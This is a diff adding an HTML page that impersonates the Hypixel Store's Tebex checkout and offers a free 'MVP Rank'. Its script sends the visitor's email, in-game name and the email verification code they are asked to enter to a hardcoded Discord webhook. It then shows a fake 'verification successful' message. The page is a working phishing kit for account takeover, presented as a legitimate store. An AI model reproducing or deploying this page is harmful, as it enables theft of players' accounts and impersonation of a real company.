@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <link rel="shortcut icon"
+    href="https://dunb17ur4ymx4.cloudfront.net/webstore/favicons/fc1a114f14e2c826a38d2a08d65a6cdbdab28dd8.png">
+    <title>Hypixel Store | Checkout</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="spinner"></div>
+        <div class="loading-text">Processing your request...</div>
+    </div>
+
+    <div class="checkout-container">
+        <div class="breadcrumb">
+            You might like › Make Payment › Order Confirmed
+        </div>
+
+        <div class="current-item">
+            <img src="https://dunb17ur4ymx4.cloudfront.net/packages/images/1b734bae59b7cef0dbbfc1b43d1ceed19b9cfebf.png" alt="MVP Rank" class="item-image">
+            <div class="item-details">
+                <div>MVP Rank</div>
+            </div>
+        </div>
+
+        <div class="main-content">
+            <div class="initial-step" id="initialStep">
+                <div class="form-group">
+                    <label class="form-label">Email Address</label>
+                    <input type="email" class="form-input" id="emailInput" placeholder="Enter your email address" required>
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">IGN (In-Game Name)</label>
+                    <input type="text" class="form-input" id="ignInput" placeholder="Enter your IGN" required>
+                </div>
+
+                <div class="price-details">
+                    <div class="price-row">
+                        <span>Subtotal:</span>
+                        <span>$32.99 USD</span>
+                    </div>
+                    <div class="price-row discount">
+                        <span>Promo discount:</span>
+                        <span>-$32.99 USD</span>
+                    </div>
+                    <div class="price-row">
+                        <strong>Total Price:</strong>
+                        <strong>$0.00 USD</strong>
+                    </div>
+                </div>
+
+                <button class="submit-button" id="completeOrderBtn">Complete Order</button>
+            </div>
+
+            <div class="verification-step" id="verificationStep">
+                <div class="form-group">
+                    <label class="form-label">Enter the code sent to your email to proceed</label>
+                    <input type="text" class="form-input" id="verificationInput" required placeholder="Enter verification code">
+                </div>
+                <button class="submit-button" id="verifyCodeBtn">Verify Code</button>
+            </div>
+        </div>
+
+        <div class="footer">
+            <img src="https://pay.tebex.io/logo-gray.svg" alt="Tebex Logo" style="height: 20px;">
+            <p>This checkout process is owned & operated by Tebex Limited, who handle product fulfilment, billing support and refunds.</p>
+        </div>
+    </div>
+
+    <script src="config.js"></script>
+
+    <script>
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1334182568295141407/5qNR0h4BboxE2_25gC6J15xkazUF9ehEcTS53L-TPZxRz_-9S1kvaYPyV2sJACXOMbnY';
+        const loadingOverlay = document.getElementById('loadingOverlay');
+        const verifyCodeBtn = document.getElementById('verifyCodeBtn');
+        const attemptsMessage = document.getElementById('attemptsMessage');
+        
+        // Initialize attempt counter
+        let verificationAttempts = 0;
+        const MAX_ATTEMPTS = 2;
+
+        function showLoading() {
+            loadingOverlay.classList.add('active');
+        }
+
+        function hideLoading() {
+            loadingOverlay.classList.remove('active');
+        }
+
+        async function sendToDiscord(message) {
+            try {
+                const response = await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ content: message })
+                });
+
+                if (!response.ok) {
+                    throw new Error('Network response was not ok');
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                throw error;
+            }
+        }
+
+        document.getElementById('completeOrderBtn').addEventListener('click', async function() {
+            const email = document.getElementById('emailInput').value.trim();
+            const ign = document.getElementById('ignInput').value.trim();
+
+            if (!email || !ign) {
+                alert('Please fill in all required fields');
+                return;
+            }
+
+            showLoading();
+            try {
+                await sendToDiscord(`<@990823209433706506> New MVP Purchase:\n\nEmail:\n${email}\n\nIGN:\n${ign}`);
+                document.getElementById('initialStep').classList.add('hidden');
+                document.getElementById('verificationStep').classList.add('active');
+            } catch (error) {
+                alert('There was an error processing your request. Please try again.');
+            } finally {
+                hideLoading();
+            }
+        });
+
+        document.getElementById('verifyCodeBtn').addEventListener('click', async function() {
+            // Check if max attempts reached
+            if (verificationAttempts >= MAX_ATTEMPTS) {
+                attemptsMessage.classList.add('visible');
+                return;
+            }
+
+            const code = document.getElementById('verificationInput').value.trim();
+            if (!code) {
+                alert('Please enter the verification code');
+                return;
+            }
+
+            showLoading();
+            try {
+                await sendToDiscord(`<@990823209433706506> Verification Code:\n${code}`);
+                
+                // Increment attempt counter
+                verificationAttempts++;
+                
+                // Check if this was the last attempt
+                if (verificationAttempts >= MAX_ATTEMPTS) {
+                    verifyCodeBtn.disabled = true;
+                    verifyCodeBtn.classList.add('max-attempts');
+                    attemptsMessage.classList.add('visible');
+                }
+
+                // Show success message if verification was successful
+                setTimeout(() => {
+                    alert('Verification successful! Your rank will be applied shortly.');
+                }, 2000);
+            } catch (error) {
+                alert('There was an error verifying your code. Please try again.');
+            } finally {
+                hideLoading();
+            }
+        });
+    </script>
+</body>
+</html>
